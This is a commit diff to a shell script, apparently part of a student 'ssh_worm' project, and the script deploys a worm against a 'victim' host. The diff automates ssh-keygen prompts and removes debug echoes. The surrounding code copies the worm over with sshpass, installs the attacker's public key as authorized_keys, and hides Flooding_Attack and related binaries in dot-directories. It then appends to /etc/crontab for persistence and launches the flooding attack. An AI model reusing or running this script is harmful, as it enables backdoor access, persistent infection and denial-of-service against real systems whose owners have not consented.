aef1e2a33245b453427b66619e692d84a1fceb62
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 20:43:47 +0800

    debug

--- qq.sh
+++ qq.sh
@@ -6,11 +6,28 @@ read -p "Enter Victim IP Address: " IP_Address
 
 sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop
 
-
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-ssh-keygen
+if ["$1" = "y"]
+then
+	(
+	echo "\r"
+	sleep 1
+	echo "y\r"
+	sleep 1
+	echo "\r"
+	sleep 1
+	echo "\r"
+	)|ssh-keygen
+else 
+	(
+	echo "\r"
+	sleep 1
+	echo "n\r"
+	sleep 1
+	)|ssh-keygen
+fi
 
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
@@ -22,21 +39,13 @@ ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore";
 			cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1;
 			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1 > /dev/null 2>&1'
 
-echo "qq1"
-
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
 			mkdir -p $Hidden2;
 			cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2;
 			cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2;
 			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2 > /dev/null 2>&1'
 
-echo "qq2"
-
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
 			echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab;
 			cd "$Hidden2" && ./Flooding_Attack;
 			cd /home/victim/Desktop/ssh_worm > /dev/null 2>&1'
-
-echo "qq3"
-
-ssh victim@"$IP_Address"
